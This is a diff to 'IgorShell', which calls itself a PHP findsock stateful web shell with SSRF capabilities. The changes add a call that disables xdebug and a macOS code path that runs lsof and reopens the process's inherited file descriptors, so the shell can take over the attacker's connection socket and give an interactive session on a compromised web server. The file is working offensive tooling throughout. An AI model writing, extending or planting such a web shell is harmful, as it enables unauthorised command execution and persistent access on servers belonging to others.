@@ -2,7 +2,7 @@
 
 /*
  *    IgorShell, findsock php statefull shell with ssrf capabilities.
- *    Author: Captain, Mantis
+ *    Author: Captain, Mantis, Fox
  *    Date: 05-08-2013
  *    Dependencies: PHP >= 5.3.6
  *    USAGE: 
@@ -13,6 +13,9 @@
  *      [shell magically spawns]
  *      $SINIT (<-- optional in case you want a pretty shell)
  */
+
+// Kill xdebug if available
+if(function_exists('xdebug_disable')) { xdebug_disable(); }
 
 // Disable timing out as we wish to facilitate a stateful shell session.
 set_time_limit(0);
@@ -76,40 +79,74 @@ class IgorShell {
 
         $it = new DirectoryIterator("glob:///proc/self/fd/*");
        
-        // -- This code is here because I need to finish writing an implementation for non-linux operating systems
-        // $x = `lsof`;
-        // $return = array();
-        // if($b = preg_split('/(\t|\s)+/', $x)){
-        //     $i = 0;
-        //     foreach($b as $key => $value){
-        //         var_dump($key, $value);
-        //     }
-        // }
-        foreach($it as $f) {
+        switch(true) {
+        case stristr(PHP_OS, 'DAR'):
+            $pid = $this->m_Pid;
+            $x = `lsof -p $pid`;
+            $r = preg_split('/\s+/', $x);
+            if ($r) {
+                $n = 0;
+                $c = count($r);
+                $a = $d = array();
+                for ($i = 0 ; $i < 9 ; ++$i) {
+                    $a[] = $r[$n++];
+                }
+                while($n < $c) {
+                    $t = array();
+                    for ($i = 0 ; $i < 9 ; ++$i) {
+                        $t[$a[$i]] = @$r[$n++];
+                    }
+                    $d[] = $t;
+                }
+                $c = count($d);
+                for ($i = 0 ; $i < $c ; ++$i) {
+                    list($fd, $mode, $type) = sscanf($d[$i]['FD'], '%d%c%c');
+                    if ($fd) {
+                        $t = array();
+                        $t['fd'] = $fd = fopen('php://fd/' . $fd, $mode);
+                        if ($fd) {
+                            $details = stream_get_meta_data($fd);
+                            $t['type'] = $details['stream_type'];
+                            $t['state'] = $details['blocked'];
+                            $t['uri'] = $details['uri'];
+                            $t['mode'] = $details['mode'];
+                            $t['filepath'] = $d[$i]['NAME'];
+                            $this->m_FileDescriptors[$fd] = $t;
+                        } else {
+                            echo 'Fuck...' . "\n";
+                        }
+                    }
+                }
+            } else {
+                die('Fuck me');
+            }
+            break;
+        default:
+            foreach($it as $f) {
+                $tmpArr = array();
 
-            $tmpArr = array();
+                // Create resource from fd
+                $tmpArr['fd']    = $fd = fopen("php://fd/" . $f->getFilename(), 'r+');
 
-            // Create resource from fd
-            $tmpArr['fd']    = $fd = fopen("php://fd/" . $f->getFilename(), 'r+');
+                // Determine type
+                $details         = stream_get_meta_data($fd);
+                $tmpArr['type']  = $details['stream_type'];
 
-            // Determine type
-            $details         = stream_get_meta_data($fd);
-            $tmpArr['type']  = $details['stream_type'];
+                // Determine Blocked / Non-Blocked state
+                $tmpArr['state'] = $details['blocked'];
 
-            // Determine Blocked / Non-Blocked state
-            $tmpArr['state'] = $details['blocked'];
+                // Determine uri
+                $tmpArr['uri']   = $details['uri'];
 
-            // Determine uri
-            $tmpArr['uri']   = $details['uri'];
+                // fd mode
+                $tmpArr['mode']  = $details['mode'];
 
-            // fd mode
-            $tmpArr['mode']  = $details['mode'];
+                // retrieve filepath
+                $tmpArr['filepath'] = readlink('/proc/'.$this->m_Pid.'/fd/'.$f->getFilename());
 
-            // retrieve filepath
-            $tmpArr['filepath'] = readlink('/proc/'.$this->m_Pid.'/fd/'.$f->getFilename());
-
-            // Save
-            $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
+                // Save
+                $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
+            }
         }
     }
 
